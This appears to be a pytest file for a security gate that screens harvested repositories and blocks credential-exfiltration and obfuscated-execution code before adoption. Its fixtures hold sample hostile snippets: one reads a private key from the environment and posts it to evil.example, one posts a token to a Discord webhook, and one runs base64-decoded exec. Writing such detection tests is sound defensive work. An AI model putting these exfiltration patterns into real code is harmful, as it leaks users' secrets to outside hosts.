"""Repo security gate blocks credential-harvesting / RCE code before adoption."""
from __future__ import annotations

from repo_harvester.security_gate import assess_repo_security, scan_file_security


def test_credential_exfiltration_is_blocked():
    text = (
        "import os, requests\n"
        "key = os.environ['PRIVATE_KEY']\n"
        "requests.post('https://evil.example/collect', json={'k': key})\n"
    )
    findings = scan_file_security("steal.py", text)
    assert any(f["category"] == "credential_exfiltration" for f in findings)
    verdict = assess_repo_security({"steal.py": text})
    assert verdict["verdict"] == "BLOCK"
    assert "credential_exfiltration" in verdict["block_reasons"]
    assert verdict["adoptable_without_human_review"] is False


def test_obfuscated_dynamic_execution_is_blocked():
    text = "import base64\nexec(base64.b64decode('cHJpbnQoMSk=').decode())\n"
    verdict = assess_repo_security({"dropper.py": text})
    assert verdict["verdict"] == "BLOCK"
    assert "obfuscated_dynamic_execution" in verdict["block_reasons"]


def test_exfil_endpoint_with_secret_is_blocked():
    text = (
        "token = load_dotenv()\n"
        "send('https://discordapp.com/api/webhooks/123/abc', token)\n"
    )
    verdict = assess_repo_security({"beacon.py": text})
    assert verdict["verdict"] == "BLOCK"


def test_install_side_effect_is_review_not_block():
    text = "from setuptools import setup\nimport subprocess\nsubprocess.run(['echo','hi'])\n"
    verdict = assess_repo_security({"setup.py": text})
    assert verdict["verdict"] == "REVIEW"
    assert "install_time_side_effect" in verdict["review_reasons"]


def test_benign_strategy_code_is_safe():
    text = (
        "import numpy as np\n"
        "def signal(prices):\n"
        "    return np.mean(prices[-20:]) > np.mean(prices[-50:])\n"
    )
    verdict = assess_repo_security({"strategy.py": text})
    assert verdict["verdict"] == "SAFE"
    assert verdict["adoptable_without_human_review"] is True


def test_secret_read_without_outbound_is_not_blocked():
    # Reading an env var alone (no outbound) is normal config, not exfiltration.
    text = "import os\nAPI_KEY = os.environ.get('KALSHI_KEY')\n"
    verdict = assess_repo_security({"config.py": text})
    assert verdict["verdict"] == "SAFE"


def test_incorporation_skips_security_blocked_plans(tmp_path, monkeypatch):
    import repo_harvester.incorporation_engine as engine
    from repo_harvester.classifier import RepoVerdict

    monkeypatch.setattr(engine, "load_registry", lambda: {
        "incorporated": [], "pending_tests": [], "transient_failures": [],
    })
    saved = {}
    monkeypatch.setattr(engine, "save_registry", lambda r: saved.update(r))
    monkeypatch.setattr(engine, "load_adapter_plans_v2", lambda: [{
        "repo": "evil/repo",
        "verdict": RepoVerdict.ADAPTER_TARGET.value,
        "security": {"verdict": "BLOCK", "block_reasons": ["credential_exfiltration"]},
        "plans": [{"adapter_name": "evil_adapter"}],
    }])

    result = engine.incorporate_adapter_plans()
    assert result["pending"] == []
    assert any(s.get("reason") == "security_block" for s in result["skipped"])
    assert any(f.get("verdict") == "SECURITY_BLOCK"
               for f in saved.get("transient_failures", []))
